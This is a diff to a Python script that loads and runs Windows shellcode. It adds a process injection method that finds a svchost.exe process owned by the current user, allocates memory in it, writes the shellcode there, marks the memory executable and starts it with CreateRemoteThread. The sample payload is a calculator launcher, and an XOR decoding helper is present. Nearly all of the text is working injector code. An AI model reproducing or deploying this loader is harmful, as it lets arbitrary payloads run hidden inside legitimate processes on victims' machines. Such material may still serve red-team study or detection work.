@@ -1,9 +1,13 @@
 #!/usr/bin/env python3
 
+import os
 import ctypes
 import ctypes.wintypes as wt
 import platform
 import numpy
+import random
+import psutil
+import argparse
 
 
 class ShellcodeExecute():
@@ -52,6 +56,26 @@ class ShellcodeExecute():
     HEAP_CREATE_ENABLE_EXECUTE = 0x00040000
     HEAP_ZERO_MEMORY = 0x00000008
 
+    PROCESS_SOME_ACCESS = 0x000028
+    MEM_COMMIT = 0x1000
+    MEM_RESERVE = 0x2000
+    MEM_COMMIT_RESERVE = 0x3000
+
+    PAGE_READWRITE = 0x04
+    PAGE_READWRITE_EXECUTE = 0x40
+    PAGE_READ_EXECUTE = 0x20
+
+    # CloseHandle()
+    CloseHandle = ctypes.windll.kernel32.CloseHandle
+    CloseHandle.argtypes = [wt.HANDLE]
+    CloseHandle.restype = wt.BOOL
+
+    # CreateRemoteThread()
+    CreateRemoteThread = ctypes.windll.kernel32.CreateRemoteThread
+    CreateRemoteThread.argtypes = [
+        wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.LPVOID, wt.LPVOID, wt.DWORD, wt.LPVOID]
+    CreateRemoteThread.restype = wt.HANDLE
+
     # CreateThread()
     CreateThread = ctypes.windll.kernel32.CreateThread
     CreateThread.argtypes = [
@@ -69,17 +93,40 @@ class ShellcodeExecute():
     HeapAlloc.argtypes = [wt.HANDLE, wt.DWORD, ctypes.c_size_t]
     HeapAlloc.restype = wt.LPVOID
 
+    # OpenProcess()
+    OpenProcess = ctypes.windll.kernel32.OpenProcess
+    OpenProcess.argtypes = [wt.DWORD, wt.BOOL, wt.DWORD]
+    OpenProcess.restype = wt.HANDLE
+
     # RtlMoveMemory()
     RtlMoveMemory = ctypes.windll.kernel32.RtlMoveMemory
     RtlMoveMemory.argtypes = [wt.LPVOID, wt.LPVOID, ctypes.c_size_t]
     RtlMoveMemory.restype = wt.LPVOID
+
+    # VirtualAllocEx()
+    VirtualAllocEx = ctypes.windll.kernel32.VirtualAllocEx
+    VirtualAllocEx.argtypes = [wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.DWORD]
+    VirtualAllocEx.restype = wt.LPVOID
+
+    # VirtualProtectEx()
+    VirtualProtectEx = ctypes.windll.kernel32.VirtualProtectEx
+    VirtualProtectEx.argtypes = [
+        wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.LPVOID]
+    VirtualProtectEx.restype = wt.BOOL
 
     # WaitForSingleObject
     WaitForSingleObject = ctypes.windll.kernel32.WaitForSingleObject
     WaitForSingleObject.argtypes = [wt.HANDLE, wt.DWORD]
     WaitForSingleObject.restype = wt.DWORD
 
-    def __init__(self, shellcode=None):
+    # WriteProcessMemory()
+    WriteProcessMemory = ctypes.windll.kernel32.WriteProcessMemory
+    WriteProcessMemory.argtypes = [
+        wt.HANDLE, wt.LPVOID, wt.LPCVOID, ctypes.c_size_t, wt.LPVOID]
+    WriteProcessMemory.restype = wt.BOOL
+
+
+    def __init__(self, shellcode=None, method=0, preferred_process='svchost.exe'):
         print('''\
   _______________________________________________________
 
@@ -99,7 +146,12 @@ class ShellcodeExecute():
             print('[*] 32-Bit Python Interpreter')
             self.shellcode = self.calc_x86
             #self.shellcode = self.xorstr(self.buf, b'myencryptionkey')
-        self.execute()
+
+        self.preferred_process = preferred_process
+        if method == 0:
+            self.execute()
+        elif method == 1:
+            self.inject()
 
     def execute(self):
         heap = self.HeapCreate(
@@ -112,6 +164,45 @@ class ShellcodeExecute():
         print('[*] CreateThread() in same process.')
         self.WaitForSingleObject(thread, 0xFFFFFFFF)
 
+    def inject(self):
+        pid = self.find_process(self.preferred_process)
+        ph = self.OpenProcess(self.PROCESS_SOME_ACCESS, False, pid)
+        print('[*] PID {:d} handle is: 0x{:06X}'.format(pid, ph))
+        if ph == 0:
+            print("[-] ERROR: OpenProcess(): {}".format(self.kernel32.GetLastError()))
+            return
+
+        memptr = self.VirtualAllocEx(ph, 0, len(self.shellcode),
+            self.MEM_COMMIT_RESERVE, self.PAGE_READWRITE
+        )
+        print('[*] VirtualAllocEx() memory at: 0x{:08X}'.format(memptr))
+        if memptr == 0:
+            print("[-] ERROR: VirtualAllocEx(): {}".format(self.kernel32.GetLastError()))
+            return
+
+        nbytes = ctypes.c_int(0)
+        result = self.WriteProcessMemory(ph, memptr, self.shellcode,
+            len(self.shellcode), ctypes.byref(nbytes)
+        )
+        print('[+] Bytes written = {}'.format(nbytes.value))
+        if result == 0:
+            print("[-] ERROR: WriteProcessMemory(): {}".format(self.kernel32.GetLastError()))
+            return
+
+        old_protection = ctypes.pointer(wt.DWORD())
+        result = self.VirtualProtectEx(ph, memptr, len(self.shellcode),
+            self.PAGE_READ_EXECUTE, old_protection
+        )
+        if result == 0:
+            print("[-] ERROR: VirtualProtextEx(): {}".format(self.kernel32.GetLastError()))
+            return
+
+        th = self.CreateRemoteThread(ph, None, 0, memptr, None, 0, None)
+        if th == 0:
+            print("[-] ERROR: CreateRemoteThread(): {}".format(self.kernel32.GetLastError()))
+            return
+        self.CloseHandle(ph)
+
     def xorstr(self, data, k):
         m = int(len(data) / len(k))
         r = len(data) % len(k)
@@ -119,5 +210,37 @@ class ShellcodeExecute():
         res = numpy.bitwise_xor(bytearray(data), bytearray(newkey))
         return bytes(res)
 
+    def find_process(self, preferred='svchost.exe'):
+        # obtain username
+        domain = os.getenv('USERDOMAIN')
+        name = os.getenv('USERNAME')
+        username = '{}\\{}'.format(domain, name).lower()
+
+        candidates = {}
+        for pid in psutil.pids():
+            p = psutil.Process(pid)
+            try:
+                name = p.name()
+                procuser = p.username().lower()
+            except:
+                continue
+            if procuser == username and name.lower() == preferred:
+                candidates[pid] = name
+        choice = random.choice(list(candidates.keys()))
+        print('[*] Selected Process ID: {} ({}) to Inject'.format(
+            choice, candidates[choice]
+        ))
+        return int(choice)
+
 if __name__ == '__main__':
-    ShellcodeExecute()
+    parser = argparse.ArgumentParser()
+    parser.add_argument(
+        '-m', '--method', type=int, default=0,
+        help='method 0: same process, method 1: inject remote process'
+    )
+    parser.add_argument(
+        '-p', default='svchost.exe',
+        help='process name to target for injection'
+    )
+    args = parser.parse_args()
+    ShellcodeExecute(method=args.method)
